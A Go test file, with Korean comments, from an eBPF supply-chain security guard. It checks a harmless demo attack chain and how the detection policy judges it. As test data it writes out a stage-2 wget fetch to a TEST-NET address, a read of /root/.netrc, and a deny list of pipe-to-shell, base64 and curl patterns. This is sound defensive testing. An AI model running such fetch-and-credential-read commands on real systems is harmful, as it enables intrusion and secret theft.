package demo_test

import (
	"context"
	"strings"
	"testing"
	"time"

	"github.com/DevLSJ/ebpf-supplychain-guard/backend/internal/demo"
	"github.com/DevLSJ/ebpf-supplychain-guard/backend/internal/ingestion"
	"github.com/DevLSJ/ebpf-supplychain-guard/backend/internal/model"
	"github.com/DevLSJ/ebpf-supplychain-guard/backend/internal/rules"
)

// Tier 1 — chain(연쇄 규칙 런타임 시연, 11/04) 가젯 소스: run-attacker.sh SCENARIO=chain 과 같은 셸 본문을 busybox 컨테이너로.
// 패키지를 올리지 않으므로 archive 단계가 없다(ping → create → start → wait → remove). 이름은 sg-install-demo-* 그대로
func TestDemoChainDockerFlow(t *testing.T) {
	fd := &fakeDocker{exit: 137}
	h := newHarness(t, demo.Options{Docker: fd, Timeout: time.Second}, false, nil)
	run, err := h.svc.Start(context.Background(), "chain")
	if err != nil || run.Status != "running" || !strings.HasPrefix(run.Container, "sg-install-demo-") {
		t.Fatalf("start: %+v %v", run, err)
	}
	h.svc.Wait()
	want := []string{"ping", "create", "start:cid123", "wait:cid123", "remove:cid123:true"}
	if calls := fd.list(); strings.Join(calls, " ") != strings.Join(want, " ") {
		t.Fatalf("docker calls:\n got %v\nwant %v", calls, want)
	}
	sp := fd.spec
	if sp.Name != run.Container || sp.Image != demo.DefaultChainImage || len(sp.Cmd) != 3 || sp.Cmd[0] != "sh" || sp.Cmd[1] != "-c" || sp.Cmd[2] != demo.ChainScript {
		t.Fatalf("create spec: %+v", sp)
	}
	if len(sp.Env) != 0 || sp.Labels["supplyguard.demo"] != "install" {
		t.Fatalf("env · labels: %+v", sp)
	}
	s, err := h.rv.GetInstall(run.InstallID)
	if err != nil || s.Label() != "pip ./reqeusts" || s.Image != demo.DefaultChainImage || !s.Demo {
		t.Fatalf("session: %+v %v", s, err)
	}
	if st := h.svc.Status(); st.Last == nil || st.Last.Status != "finished" || *st.Last.ExitCode != 137 {
		t.Fatalf("status: %+v", st.Last)
	}
	// 이미지는 Options.ChainImage 로 바꿀 수 있다(오프라인 미러 등)
	fd2 := &fakeDocker{}
	h2 := newHarness(t, demo.Options{Docker: fd2, ChainImage: "registry.local/busybox:1.36", Timeout: time.Second}, false, nil)
	if _, err := h2.svc.Start(context.Background(), "chain"); err != nil {
		t.Fatal(err)
	}
	h2.svc.Wait()
	if fd2.spec.Image != "registry.local/busybox:1.36" {
		t.Fatalf("chain image override: %q", fd2.spec.Image)
	}
}

// 셸 본문은 무해 원칙 그대로: TEST-NET 203.0.113.7 · 없는 파일 열기 시도만. PID1(sh -c 본문) exec 자체는 기본 정책에 걸리지 않는다
func TestDemoChainScriptHarmless(t *testing.T) {
	for _, want := range []string{"timeout 3 wget -q -O /dev/null http://203.0.113.7/stage2", "sleep 1", "cat /root/.netrc >/dev/null 2>&1 || true"} {
		if !strings.Contains(demo.ChainScript, want) {
			t.Errorf("chain script must contain %q", want)
		}
	}
	for _, bad := range []string{"| sh", "|sh", "| bash", "base64", "curl"} {
		if strings.Contains(demo.ChainScript, bad) {
			t.Errorf("chain script must not contain %q", bad)
		}
	}
	pid1 := model.Event{Kind: model.KindExec, Timestamp: time.Now(), ContainerID: "c1", ContainerName: "sg-install-demo-1", ImageName: demo.DefaultChainImage,
		Comm: "sh", Args: "sh -c " + demo.ChainScript}
	if v := defaultEngine(t).Evaluate(pid1); v.Matched {
		t.Fatalf("PID1 exec must not match the default policy: %s %s", v.RuleID, v.Reason)
	}
}

// Tier 1(11/09) — 첫 동작 전 1초 대기. Docker Desktop 은 컨테이너 발견이 docker-events 라 시작 직후 약 0.1초를 못 본다
// (11/09 Mac 실측: 1단계 wget exec 를 놓쳐 sandbox-secrets 1건만 · 종료 0, sg-vm fanotify 는 no-shell-download 로 1단계 격리 137).
// 첫 wget 앞에는 echo(셸 내장) · sleep 1 만 있어야 하고, 단계 순서 wget → sleep 1 → cat /root/.netrc 는 그대로다
func TestDemoChainScriptStartDelay(t *testing.T) {
	lines := strings.Split(demo.ChainScript, "\n")
	find := func(from int, prefix string) int {
		for i := from; i < len(lines); i++ {
			if strings.HasPrefix(strings.TrimSpace(lines[i]), prefix) {
				return i
			}
		}
		return -1
	}
	wget := find(0, "timeout 3 wget ")
	if wget < 0 {
		t.Fatalf("no wget step:\n%s", demo.ChainScript)
	}
	delayed := false
	for _, l := range lines[:wget] {
		switch l = strings.TrimSpace(l); {
		case l == "sleep 1":
			delayed = true
		case strings.HasPrefix(l, "echo "):
		default:
			t.Errorf("only echo · sleep 1 may run before the first wget, got %q", l)
		}
	}
	if !delayed {
		t.Errorf("chain script must wait 1s (sleep 1) before the first wget — docker-events misses the first ~0.1s:\n%s", demo.ChainScript)
	}
	gap := find(wget+1, "sleep 1")
	cat := find(wget+1, "cat /root/.netrc")
	if gap != wget+1 || cat != gap+1 {
		t.Errorf("step order must stay wget → sleep 1 → cat /root/.netrc (lines %d · %d · %d):\n%s", wget, gap, cat, demo.ChainScript)
	}
}

// mock 소스: chain 은 pip 단계 없이 셸 → timeout → wget → 연결 → sleep → cat → 파일 열기 순서로 재생한다
func TestDemoChainMockEvents(t *testing.T) {
	m := ingestion.NewMock()
	m.Interval, m.AttackIn, m.RestartIn, m.Step = time.Hour, time.Hour, time.Hour, time.Millisecond
	out := make(chan model.Event, 4096)
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	go m.Run(ctx, out)
	for range 3 {
		<-out
	}
	h := newHarness(t, demo.Options{Simulator: m}, false, m.SimulateInstall)
	run, err := h.svc.Start(context.Background(), "chain")
	if err != nil {
		t.Fatal(err)
	}
	evs := collect(t, out, run.Container)
	var keys []string
	for _, ev := range evs {
		keys = append(keys, eventKey(ev))
	}
	want := "start exec:sh exec:timeout exec:wget connect:203.0.113.7 exec:sleep exec:cat open:/root/.netrc exit"
	if strings.Join(keys, " ") != want {
		t.Fatalf("events:\n got %v\nwant %s", keys, want)
	}
	if evs[0].ImageName != demo.DefaultChainImage || evs[4].DstPort != 80 {
		t.Fatalf("image %q · port %d", evs[0].ImageName, evs[4].DstPort)
	}
	h.svc.Wait()
}

// chainEvents: 연쇄 시연이 내는 이벤트(가젯 · mock 공통) — 컨테이너 이름 name, 1초 간격
func chainEvents(name string) []model.Event {
	t0 := time.Date(2026, 11, 4, 12, 0, 0, 0, time.UTC)
	evs := []model.Event{
		{Kind: model.KindExec, Comm: "wget", Args: "wget -q -O /dev/null http://203.0.113.7/stage2"},
		{Kind: model.KindConnect, Comm: "wget", DstIP: "203.0.113.7", DstPort: 80, DNSTraced: true},
		{Kind: model.KindOpen, Comm: "cat", Path: "/root/.netrc"},
	}
	for i := range evs {
		evs[i].Timestamp, evs[i].ContainerID, evs[i].ContainerName, evs[i].ImageName = t0.Add(time.Duration(i)*time.Second), "cid-"+name, name, demo.DefaultChainImage
	}
	return evs
}

// withRule: 기본 정책에서 id 규칙만 바꾼 사본
func withRule(t *testing.T, edit map[string]func(*rules.Rule)) *rules.Engine {
	t.Helper()
	rs := defaultEngine(t).Rules()
	for i := range rs {
		if f, ok := edit[rs[i].ID]; ok {
			f(&rs[i])
		}
	}
	return rules.New(rs)
}

func dry(r *rules.Rule) { r.DryRun = true }

// 근거(11/04) — 기본 정책에서 연쇄 시연이 어떻게 끝나는지. 정책은 바꾸지 않는다(테스트 안 사본만)
//
//  1. 연쇄 1단계(exec curl|wget)를 채우는 exec 는 모두 no-shell-download(kill · 시험 운영 아님)에도 걸린다 —
//     같은 매칭 함수(comm 또는 argv[0] basename)이고 1단계 목록 ⊂ no-shell-download 목록, no-shell-download 는 컨테이너 범위가 없다.
//     → 1단계 이벤트에서 격리되고, 컨테이너가 죽어 2 · 3단계가 일어나지 않는다(연쇄 미완성 · sequence 주석도 없음)
//  2. no-shell-download 만 시험 운영으로 둬도 sg-install-* 이름에서는 2단계(TEST-NET 직접 IP 연결)가 sandbox-egress(directIp: kill)에 격리된다
//  3. 둘 다 시험 운영이면 3단계(/root/.netrc)에서 연쇄가 완성되지만 sandbox-secrets(kill)가 더 강해 판정은 그쪽, 연쇄는 sequence 주석
//  4. sg-install-* 가 아닌 런타임 컨테이너(run-attacker 의 pkg-reqeusts)는 no-shell-download 만 시험 운영이면 연쇄가 판정을 낸다
func TestChainDemoVersusDefaultPolicy(t *testing.T) {
	const box = "sg-install-demo-1793764843"

	// 1-a: 1단계를 채우는 모든 exec 모양(comm · argv[0] · 경로)이 no-shell-download 에도 걸린다
	eng := defaultEngine(t)
	for _, ev := range []model.Event{
		{Comm: "wget", Args: "wget -q http://203.0.113.7/x"},
		{Comm: "curl", Args: "curl -s http://203.0.113.7/x"},
		{Comm: "busybox", Args: "/usr/bin/wget http://203.0.113.7/x"}, // comm 은 다르지만 argv[0] basename 이 wget
		{Comm: "wget", Args: "/tmp/fetch http://203.0.113.7/x"},       // argv[0] 은 다르지만 comm 이 wget
	} {
		ev.Kind, ev.Timestamp, ev.ContainerID, ev.ContainerName = model.KindExec, time.Now(), "c", box
		v := eng.Evaluate(ev)
		if !v.Matched || v.RuleID != "no-shell-download" || v.Action != model.ActionKill || v.DryRun {
			t.Errorf("%s / %s: want no-shell-download kill, got %s %s dry=%v", ev.Comm, ev.Args, v.RuleID, v.Action, v.DryRun)
		}
	}

	// 1-b: 기본 정책 — 첫 이벤트(wget exec)가 no-shell-download 실제 격리. 실제로는 여기서 컨테이너가 죽는다
	evs := chainEvents(box)
	if v := eng.Observe(evs[0]); v.RuleID != "no-shell-download" || v.Action != model.ActionKill || v.DryRun || v.Sequence != nil {
		t.Fatalf("default policy, step 1: %+v", v)
	}

	// 2: no-shell-download 만 시험 운영 — 1단계는 격리 대상(알림), 2단계 직접 IP 연결이 sandbox-egress 실제 격리
	eng = withRule(t, map[string]func(*rules.Rule){"no-shell-download": dry})
	if v := eng.Observe(evs[0]); v.RuleID != "no-shell-download" || !v.DryRun {
		t.Fatalf("no-shell-download dryRun, step 1: %+v", v)
	}
	if v := eng.Observe(evs[1]); v.RuleID != "sandbox-egress" || v.Action != model.ActionKill || v.DryRun || v.Sequence != nil {
		t.Fatalf("no-shell-download dryRun, step 2 in sg-install-*: %+v", v)
	}

	// 3: no-shell-download · sandbox-egress 시험 운영 — 연쇄 완성, 판정은 sandbox-secrets(kill), 연쇄는 dryRun 주석
	eng = withRule(t, map[string]func(*rules.Rule){"no-shell-download": dry, "sandbox-egress": dry})
	for _, ev := range evs[:2] {
		eng.Observe(ev)
	}
	v := eng.Observe(evs[2])
	if v.RuleID != "sandbox-secrets" || v.DryRun || v.Sequence == nil || v.Sequence.RuleID != "chain-download-secrets" || !v.Sequence.DryRun || len(v.Sequence.Steps) != 3 {
		t.Fatalf("both dryRun, step 3: %+v seq=%+v", v, v.Sequence)
	}

	// 4: 런타임 컨테이너 — no-shell-download 만 시험 운영이면 연쇄가 판정(kill · dryRun = 격리 대상)
	eng = withRule(t, map[string]func(*rules.Rule){"no-shell-download": dry})
	rt := chainEvents("pkg-reqeusts")
	for _, ev := range rt[:2] {
		eng.Observe(ev)
	}
	if v := eng.Observe(rt[2]); v.RuleID != "chain-download-secrets" || !v.DryRun || v.Sequence == nil {
		t.Fatalf("runtime container, step 3: %+v", v)
	}
}
